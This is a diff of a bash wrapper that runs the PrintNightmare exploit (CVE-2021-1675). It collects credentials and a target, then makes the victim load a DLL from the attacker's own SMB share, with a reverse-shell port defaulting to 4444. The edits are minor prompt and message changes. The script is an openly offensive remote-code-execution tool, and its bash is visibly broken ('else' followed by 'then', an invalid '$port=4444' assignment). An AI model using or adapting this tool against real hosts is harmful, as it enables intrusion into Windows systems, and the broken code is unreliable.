@@ -11,10 +11,9 @@ read -p "0=freddy(smb/pass)> " pass
 echo -e "[*] Grabbing internal hostname"
 sleep 2
 ipaddr=$(hostname -I | awk '{print $1}')
-echo "[?] Use $ipaddr
 
 echo -e "[*] Enter Port Number(default 4444): "
-read -p "0=freddy(port)> "
+read -p "0=freddy(port)> " port
 if [ -z "$port" ]
 then
 	$port=4444
@@ -46,7 +45,7 @@ then
 		sudo ./CVE-2021-1675.py PRINTNIGHTMARE.local/$user:$password@$target '\\$ipaddr\smb\elmStreet.dll'
 	else
 	then
-		echo "Exiting.. hack the gibson!"
+		echo "Exiting.. Hack the Gibson!"
 	fi
 else
 then
